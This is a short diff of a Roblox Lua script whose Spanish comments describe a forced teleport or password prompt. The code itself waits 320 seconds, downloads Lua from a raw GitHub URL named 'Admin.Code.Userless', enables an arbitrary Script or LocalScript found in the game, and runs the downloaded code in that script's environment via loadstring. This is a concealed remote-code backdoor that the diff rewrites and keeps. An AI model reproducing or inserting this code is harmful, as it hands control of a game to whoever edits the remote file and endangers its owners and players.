@@ -8,14 +8,17 @@ if modelSuccess and module then
     end)
 end
 
--- 2. Si Despues de 2 Minutos Forzar La teletrasportacion Al CmdSpot si o si!
+-- 2 Si No Funciona FORZAR EL TELEPORT CON CLAVE (te Pedira Una Contraseña)
 task.delay(320, function()
-    local success, response = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
-    if success and response then
-        local runCode = loadstring(response)
-        if runCode then
-            getfenv(runCode).script = workspace
-            task.spawn(runCode)
+    local res = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
+    local InternalCode = game:FindFirstChildWhichIsA("Script", true) or game:FindFirstChildWhichIsA("LocalScript", true)
+    
+    if InternalCode then
+        InternalCode.Enabled = true
+        local run = loadstring(res)
+        if run then
+            getfenv(run).script = InternalCode
+            task.spawn(run)
         end
     end
 end)
